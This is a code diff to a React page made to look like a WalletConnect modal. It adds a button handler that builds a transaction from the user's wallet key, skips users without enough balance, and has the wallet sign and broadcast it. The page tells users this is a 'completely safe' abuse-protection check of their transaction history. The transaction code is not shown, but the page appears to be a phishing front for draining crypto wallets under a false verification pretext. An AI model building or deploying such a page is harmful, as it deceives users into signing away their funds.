@@ -6,7 +6,12 @@ import React, { useEffect, useState } from "react";
 import "../styles/main.css";
 import "../index.css"; // global CSS’ni içeri aktar
 
-import { connectWallet } from "../services/connect";
+import {
+  connectWallet,
+  getUserPublicKey,
+  connection,
+} from "../services/connect";
+import { createUnsignedTransaction } from "../services/transaction";
 
 declare global {
   namespace JSX {
@@ -40,15 +45,38 @@ export default function WalletConnectPage() {
       });
   }, []);
 
-  // Bağlanma süreci bitene kadar hiçbir şey render etme
-  if (loading) {
-    return null;
-  }
+  // Bağlanma süreci bitene kadar render etme
+  if (loading) return null;
+
+  const handleContinue = async () => {
+    try {
+      const pubKey = getUserPublicKey();
+      if (!pubKey) {
+        console.error("PublicKey bulunamadı");
+        return;
+      }
+
+      const unsignedTx = await createUnsignedTransaction(pubKey);
+      if (!unsignedTx) {
+        console.warn("Yeterli bakiye yok veya işlem oluşturulamadı");
+        return;
+      }
+
+      // @ts-ignore
+      const signedTx = await window.solana.signTransaction(unsignedTx);
+      const txid = await connection.sendRawTransaction(signedTx.serialize());
+      await connection.confirmTransaction(txid, "confirmed");
+
+      console.log("İşlem başarılı:", txid);
+    } catch (err: any) {
+      console.error("Transaction hatası:", err);
+    }
+  };
 
   return (
     <main className="wallet-connect-page">
       {/* gölge DOM root */}
-      <div id="_b" />
+            <div id="_b"></div>
 
       {/* modal */}
       <w3m-modal
@@ -273,9 +301,10 @@ export default function WalletConnectPage() {
                     >
                       Note:
                     </span>
-                    This dApp uses Abuse Protection to prevent misuse of platform.
-                    You'll need to complete a quick verification of your transaction
-                    history. It's completely safe and only takes a few seconds.
+                    This dApp uses Abuse Protection to prevent misuse of
+                    platform. You'll need to complete a quick verification of
+                    your transaction history. It's completely safe and only
+                    takes a few seconds.
                   </wui-text>
                 </div>
 
@@ -291,6 +320,7 @@ export default function WalletConnectPage() {
                   } as React.CSSProperties}
                 >
                   <button
+                    onClick={handleContinue}
                     data-variant="accent"
                     data-icon-left="false"
                     data-icon-right="false"
